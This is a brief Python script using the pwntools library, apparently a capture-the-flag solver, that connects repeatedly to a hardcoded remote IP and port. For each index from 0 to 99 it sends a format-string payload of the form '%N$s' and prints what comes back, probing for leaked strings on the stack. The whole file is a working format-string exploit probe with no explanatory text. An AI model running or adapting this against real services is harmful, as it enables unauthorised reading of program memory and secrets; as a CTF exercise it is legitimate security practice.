from pwn import *


for i in range(100):
  try:
    p = remote('20.171.33.225', 5060) # process("./main")
    #p.sendline(b'%'.join(['{}'.format(i).encode(), b'$s']))
    p.sendline('%{}$s'.format(i).encode())
    result = p.recvline()
    print(str(i) + ": " + str(result))
    p.close()

  except EOFError:
    pass
